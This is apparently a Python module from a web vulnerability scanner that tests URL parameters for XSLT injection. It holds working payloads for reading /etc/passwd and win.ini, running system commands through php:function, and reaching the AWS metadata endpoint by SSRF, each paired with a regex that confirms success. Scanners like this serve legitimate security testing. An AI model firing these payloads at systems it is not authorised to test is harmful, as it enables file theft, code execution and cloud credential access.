"""
XSLT Injection Scanner Module

Detects XSLT injection vulnerabilities that can lead to:
- Remote Code Execution
- Local File Disclosure
- Server-Side Request Forgery
- Information Disclosure
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger
import re
import random
import string

logger = get_logger(__name__)


class XSLTInjectionModule(BaseModule):
    """XSLT Injection Scanner Module"""

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize XSLT Injection module"""
        super().__init__(module_path, payload_limit=payload_limit)

        # Generate unique marker
        self.marker = ''.join(random.choices(string.ascii_lowercase, k=8))

        # XSLT Injection payloads for different processors
        self.xslt_payloads = [
            # Version detection (safe - info disclosure)
            {
                'payload': '<xsl:value-of select="system-property(\'xsl:version\')"/>',
                'detect': r'[1-3]\.[0-9]',
                'description': 'XSLT version disclosure',
                'severity': 'Medium'
            },
            {
                'payload': '<xsl:value-of select="system-property(\'xsl:vendor\')"/>',
                'detect': r'(libxslt|Saxon|Xalan|Microsoft|Apache|GNOME)',
                'description': 'XSLT vendor disclosure',
                'severity': 'Medium'
            },
            # File read (Critical - libxslt)
            {
                'payload': '<xsl:copy-of select="document(\'/etc/passwd\')"/>',
                'detect': r'root:[x*]:0:0',
                'description': 'XSLT file read via document() - /etc/passwd',
                'severity': 'Critical'
            },
            {
                'payload': '<xsl:copy-of select="document(\'file:///etc/passwd\')"/>',
                'detect': r'root:[x*]:0:0',
                'description': 'XSLT file read via file:// protocol',
                'severity': 'Critical'
            },
            {
                'payload': '<xsl:copy-of select="document(\'c:/windows/win.ini\')"/>',
                'detect': r'\[(fonts|extensions|mci extensions)\]',
                'description': 'XSLT file read - win.ini (Windows)',
                'severity': 'Critical'
            },
            # PHP code execution (Critical)
            {
                'payload': '<xsl:value-of select="php:function(\'phpinfo\')"/>',
                'detect': r'PHP Version|phpinfo\(\)|Configuration',
                'description': 'XSLT PHP code execution via php:function',
                'severity': 'Critical'
            },
            {
                'payload': '<xsl:value-of select="php:function(\'system\',\'id\')"/>',
                'detect': r'uid=\d+.*gid=\d+',
                'description': 'XSLT RCE via php:function system()',
                'severity': 'Critical'
            },
            # SSRF via document()
            {
                'payload': '<xsl:copy-of select="document(\'http://169.254.169.254/latest/meta-data/\')"/>',
                'detect': r'ami-id|instance-id|hostname|iam',
                'description': 'XSLT SSRF to AWS metadata',
                'severity': 'High'
            },
        ]

        # XSLT-related parameters to test
        self.xslt_params = ['xslt', 'xsl', 'stylesheet', 'style', 'transform', 'template']

        logger.info(f"XSLT Injection module loaded: {len(self.xslt_payloads)} payloads")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for XSLT injection vulnerabilities

        Args:
            targets: List of URLs with parameters
            http_client: HTTP client

        Returns:
            List of vulnerability results
        """
        results = []

        logger.info(f"Starting XSLT Injection scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})
            method = target.get('method', 'GET').upper()

            # Look for XSLT-related parameters or test all params
            target_params = []
            for param in params:
                if any(xp in param.lower() for xp in self.xslt_params):
                    target_params.append(param)

            # If no XSLT-specific params found, test all params
            if not target_params:
                target_params = list(params.keys())

            if not target_params:
                continue

            # Get baseline response
            try:
                if method == 'POST':
                    baseline_response = http_client.post(url, data=params)
                else:
                    baseline_response = http_client.get(url, params=params)

                baseline_text = getattr(baseline_response, 'text', '') if baseline_response else ''
            except:
                baseline_text = ''

            # Test each parameter
            for param_name in target_params:
                if self.should_stop():
                    return results

                for payload_info in self.xslt_payloads:
                    payload = payload_info['payload']
                    detect_pattern = payload_info['detect']
                    description = payload_info['description']
                    severity = payload_info['severity']

                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        if method == 'POST':
                            response = http_client.post(url, data=test_params)
                        else:
                            response = http_client.get(url, params=test_params)

                        if not response:
                            continue

                        response_text = getattr(response, 'text', '')

                        # Check for detection pattern
                        match = re.search(detect_pattern, response_text, re.IGNORECASE)
                        if match:
                            # FALSE POSITIVE CHECK: Pattern shouldn't exist in baseline
                            if re.search(detect_pattern, baseline_text, re.IGNORECASE):
                                continue

                            evidence = self._build_evidence(
                                url, param_name, payload, description,
                                match.group(0), response_text
                            )

                            result = self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter=param_name,
                                payload=payload[:200],
                                evidence=evidence,
                                description=f"XSLT Injection: {description}. This can lead to information disclosure, file read, or remote code execution.",
                                confidence=0.90,
                                severity=severity,
                                method=method,
                                response=response_text[:3000]
                            )

                            result['matched_pattern'] = match.group(0)
                            result['verified'] = True

                            results.append(result)
                            logger.warning(f"✓ XSLT Injection found: {description} in {param_name}")

                            # Found vuln in this param, move to next
                            break

                    except Exception as e:
                        logger.debug(f"Error testing XSLT payload: {e}")
                        continue

        logger.info(f"XSLT Injection scan complete: {len(results)} vulnerabilities found")
        return results

    def _build_evidence(self, url: str, param: str, payload: str, desc: str, match: str, response: str) -> str:
        """Build detailed evidence"""
        context = self.extract_response_context(response, match, 150, 100)

        evidence = f"""XSLT Injection Confirmed

**Vulnerable URL:** {url}
**Vulnerable Parameter:** {param}
**Attack Type:** {desc}

**Injected Payload:**
{payload[:200]}

**Matched Pattern in Response:**
{match}

**Response Context:**
{context}

**Security Impact:**
- File disclosure (read /etc/passwd, win.ini, etc.)
- Remote Code Execution (via php:function, Java, .NET)
- Server-Side Request Forgery
- Complete server compromise possible
"""
        return evidence


def get_module(module_path: str, payload_limit: int = None):
    """Create module instance"""
    return XSLTInjectionModule(module_path, payload_limit=payload_limit)
